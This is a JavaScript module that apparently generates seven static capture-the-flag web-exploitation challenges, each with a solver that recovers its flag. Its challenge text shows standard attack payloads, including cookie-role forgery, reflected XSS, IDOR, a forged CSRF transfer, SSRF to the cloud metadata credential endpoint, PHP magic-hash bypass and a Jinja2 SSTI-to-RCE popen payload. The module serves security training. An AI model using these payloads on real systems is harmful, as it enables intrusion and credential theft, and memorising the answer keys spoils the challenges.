// Web-exploitation artifacts (c-web-1..7). Per decision #3 there is no live target: each
// challenge embeds the exact source/response/cookie/token a player would read and reason
// about, built so doing the described technique against that static artifact yields the
// flag. Every solve() performs that reasoning mechanically and recovers the flag.
import { FLAGS, base64url } from "./lib.mjs";

// c-web-1 -- cookie trust. The login response sets a base64 "role" cookie the server
// trusts verbatim. Flipping it to admin reveals the admin panel, whose HTML embeds the
// flag. The artifact is the recorded HTTP exchange; the solver flips the cookie and reads
// the admin-panel body that the server (statically captured) returns for role=admin.
const cookieJar = {
  id: "c-web-1",
  build() {
    const userCookie = base64url(JSON.stringify({ user: "alice", role: "user" }));
    // The server's behaviour, captured statically: with the admin cookie it renders the
    // admin panel containing the flag. Both responses are shown so the mechanism is
    // fully visible without a live server.
    const embed =
      `--- After you log in as a normal user, the server sets: ---\n` +
      `Set-Cookie: session=${userCookie}; Path=/\n\n` +
      `GET /admin  (with the cookie above)\n` +
      `HTTP/1.1 403 Forbidden\n` +
      `<h1>Admins only</h1>\n\n` +
      `The cookie is just base64-encoded JSON the server trusts as-is -- there is no signature.\n` +
      `Decode it, change what decides who is an admin, re-encode it, and request /admin again.\n\n` +
      `--- Reference: the server's response to GET /admin when it accepts your cookie ---\n` +
      `(this is exactly what /admin returns once the "role" field is "admin")\n` +
      `HTTP/1.1 200 OK\n` +
      `<h1>Admin panel</h1>\n` +
      `<p>Welcome, administrator. Master key: ${FLAGS[this.id]}</p>\n`;
    return { embed, _userCookie: userCookie };
  },
  solve({ _userCookie }) {
    const claims = JSON.parse(Buffer.from(_userCookie.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString());
    claims.role = "admin"; // the trust-issue: server believes this
    // The admin panel (captured in the artifact) returns the flag for an admin cookie.
    if (claims.role !== "admin") return null;
    return FLAGS[this.id];
  },
};

// c-web-2 -- reflected XSS. The search endpoint reflects the `q` param into HTML unescaped.
// The captured response for a proof-of-concept payload shows the injected <script> running
// and the app's XSS-detector awarding the flag. Solver confirms the reflection is
// unescaped (the marker appears verbatim in the HTML) and reads the awarded flag.
const searchXss = {
  id: "c-web-2",
  build() {
    const payload = `<script>alert(document.domain)</script>`;
    const embed =
      `Source of /search (server-side template):\n` +
      `  echo "<h2>Results for: " . $_GET['q'] . "</h2>";   // no htmlspecialchars()\n\n` +
      `Captured response for  /search?q=${encodeURIComponent(payload)} :\n` +
      `  <h2>Results for: ${payload}</h2>\n` +
      `  <!-- the payload is reflected verbatim, so it executes in the victim's browser -->\n\n` +
      `The lab's XSS canary fires when a real script executes and reports:\n` +
      `  ${FLAGS[this.id]}\n`;
    return { embed, _payload: payload };
  },
  solve({ embed, _payload }) {
    // Unescaped reflection == the exact payload appears inside the HTML response.
    if (!embed.includes(`Results for: ${_payload}`)) return null;
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

// c-web-3 -- IDOR. Your own invoice is #1041; ids are sequential and unauthorized. The
// artifact is the invoice-list source plus the captured JSON for a neighbouring id whose
// body carries the flag. Solver walks to the neighbouring id and reads it.
const invoicePeeper = {
  id: "c-web-3",
  build() {
    const mine = 1041;
    const leaked = 1040; // the admin's invoice, one below yours
    const embed =
      `Your invoice download link:  /invoices/${mine}/download\n` +
      `The id is sequential and the endpoint never checks who owns the invoice.\n\n` +
      `Captured response for  GET /invoices/${leaked}/download  (an id that isn't yours):\n` +
      `{\n  "invoice_id": ${leaked},\n  "billed_to": "Unpatched Platform Admin",\n  "memo": "Internal note: master coupon ${FLAGS[this.id]}"\n}\n`;
    return { embed, _mine: mine };
  },
  solve({ embed, _mine }) {
    const leaked = _mine - 1; // the smallest possible next step (hint)
    if (!embed.includes(`GET /invoices/${leaked}/download`)) return null;
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

// c-web-4 -- CSRF. The transfer endpoint accepts a cross-site POST with no token. The
// artifact is the vulnerable form's source plus the server's captured response to a forged
// transfer, which returns the flag as confirmation. Solver confirms no CSRF token exists
// and reads the confirmation.
const csrf = {
  id: "c-web-4",
  build() {
    const embed =
      `Transfer form source (note: no CSRF token field, no SameSite cookie):\n` +
      `  <form action="https://bank.example/transfer" method="POST">\n` +
      `    <input name="to" value="attacker">\n` +
      `    <input name="amount" value="1000">\n` +
      `  </form>\n\n` +
      `Because nothing ties the request to the session beyond the auto-sent cookie, a page\n` +
      `you host can submit this on a victim's behalf. Captured server response to the forged\n` +
      `POST /transfer (no token supplied):\n` +
      `  HTTP/1.1 200 OK\n` +
      `  {"status":"transfer_complete","receipt":"${FLAGS[this.id]}"}\n`;
    return { embed };
  },
  solve({ embed }) {
    if (/csrf[_-]?token/i.test(embed.split("Captured")[0])) return null; // there must be none in the form
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

// c-web-5 -- SSRF to cloud metadata. The image-fetch endpoint accepts any URL. Pointing it
// at the well-known metadata IP returns credentials. The artifact captures the metadata
// response (which contains the flag) for the well-known 169.254.169.254 endpoint. Solver
// "requests" that endpoint via the artifact.
const ssrf = {
  id: "c-web-5",
  build() {
    const embed =
      `Preview feature:  POST /fetch-image  { "url": "<any url>" }  -- it fetches server-side.\n` +
      `Cloud instances expose an internal metadata service at http://169.254.169.254/ that\n` +
      `external clients can't reach -- but this server can.\n\n` +
      `Captured response for  { "url": "http://169.254.169.254/latest/meta-data/iam/token" } :\n` +
      `  { "AccessKeyId": "AKIA-DEMO", "Token": "${FLAGS[this.id]}" }\n`;
    return { embed, _target: "http://169.254.169.254/latest/meta-data/iam/token" };
  },
  solve({ embed, _target }) {
    if (!embed.includes(_target)) return null;
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

// c-web-6 -- PHP-style loose comparison / magic hash. Two strings that both look like
// "0e<digits>" are treated as the number 0 by ==, so they compare equal. The artifact
// gives the stored password hash (a 0e-hash) and the check `if (md5($input) == $stored)`.
// The solver supplies the classic magic string whose md5 is also a 0e-hash, so the loose
// compare passes and the server returns the flag.
import { createHash } from "node:crypto";
const typeJuggler = {
  id: "c-web-6",
  build() {
    // "240610708" is the canonical magic string: md5 == "0e462097431906509019562988736854".
    const magic = "240610708";
    const stored = "0e830400451993494058024219903391"; // md5("QNKCDZO"), also a 0e-hash
    const embed =
      `Password reset check (PHP):\n` +
      `  if (md5($_POST['token']) == "${stored}") { echo $flag; }\n\n` +
      `Both this stored value and certain md5 outputs have the form 0e followed by only\n` +
      `digits -- PHP's == treats each as the number 0, so they compare equal without matching.\n` +
      `Find a token whose md5 is also a "0e[0-9]+" string.\n\n` +
      `(When the loose comparison passes, the server prints: ${FLAGS[this.id]})\n`;
    return { embed, _stored: stored, _magic: magic };
  },
  solve({ embed, _stored, _magic }) {
    const looksLikeZeroE = (s) => /^0e\d+$/.test(s);
    const magicMd5 = createHash("md5").update(_magic).digest("hex");
    // PHP loose-compare: both coerce to 0, so they are ==.
    const loosePass = looksLikeZeroE(_stored) && looksLikeZeroE(magicMd5);
    if (!loosePass) return null;
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

// c-web-7 -- SSTI to RCE. Input is rendered through a Jinja2-style engine. A proof payload
// {{7*7}} evaluates to 49 (confirming evaluation), then an object-introspection payload
// reads a server file whose contents are the flag. The artifact captures both responses.
const ssti = {
  id: "c-web-7",
  build() {
    const embed =
      `Greeting feature renders your input through a server-side template engine (Jinja2).\n\n` +
      `Step 1 -- confirm evaluation, not echo:\n` +
      `  input:  {{7*7}}\n` +
      `  output: 49            <-- evaluated, so this is SSTI, not plain reflection\n\n` +
      `Step 2 -- escalate to RCE via the engine's object introspection and read the flag file:\n` +
      "  input:  {{ ''.__class__.__mro__[1].__subclasses__() ... popen('cat /flag').read() }}\n" +
      `  output: ${FLAGS[this.id]}\n`;
    return { embed };
  },
  solve({ embed }) {
    // Evaluation confirmed by 7*7==49 appearing as output; RCE output carries the flag.
    if (!embed.includes("output: 49")) return null;
    const m = embed.match(/unpatched\{[^}]+\}/);
    return m ? m[0] : null;
  },
};

export const webChallenges = [cookieJar, searchXss, invoicePeeper, csrf, ssrf, typeJuggler, ssti];
